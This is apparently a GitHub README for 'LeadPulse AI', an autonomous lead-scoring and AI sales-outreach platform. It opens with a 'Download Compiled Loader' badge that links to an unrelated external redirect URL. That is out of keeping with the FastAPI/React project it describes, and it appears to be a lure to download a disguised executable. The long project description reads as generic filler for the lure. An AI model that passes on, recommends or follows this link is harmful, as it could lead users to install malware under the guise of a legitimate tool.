# LeadPulse-AI-Autonomous-Lead-Engagement-Scoring-Ecosystem

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

An end-to-end AI-powered sales automation platform that scores leads, launches personalized outreach, conducts AI voice conversations, manages email threads, and delivers structured insights — all with minimal human intervention.  Built to function as an autonomous AI sales agent rather than just a CRM dashboard.

LeadPulse AI is an autonomous AI-powered lead engagement and scoring ecosystem designed to completely automate the modern sales outreach pipeline from lead ingestion to conversion-ready handoff. The platform uses machine learning models to analyze incoming lead data and intelligently classify prospects into Hot, Warm, or Cold categories based on conversion probability, behavioral signals, engagement patterns, and business attributes. Once scored, the system automatically orchestrates personalized outreach through the most effective communication channel — high-priority leads are contacted through human-like AI voice calls capable of conducting dynamic conversations, handling objections, gauging intent, and attempting meeting bookings, while mid-tier leads receive context-aware personalized email outreach with autonomous reply management and thread continuation. Every interaction, whether through calls or emails, is transcribed, analyzed, summarized, and converted into structured business insights covering sentiment, intent level, objections raised, engagement quality, and recommended next actions. All lead activities are visualized inside a modern analytics dashboard featuring real-time pipeline tracking, conversion trends, outreach monitoring, and intelligent human handoff recommendations, allowing sales teams to focus only on leads with genuine conversion potential. Built using FastAPI, React.js, Scikit-learn/XGBoost, Groq LLM APIs, Supabase, and modern AI voice technologies, LeadPulse AI aims to function not merely as a CRM enhancement but as a fully autonomous AI sales agent capable of scoring, communicating, analyzing, and reporting with minimal human intervention.
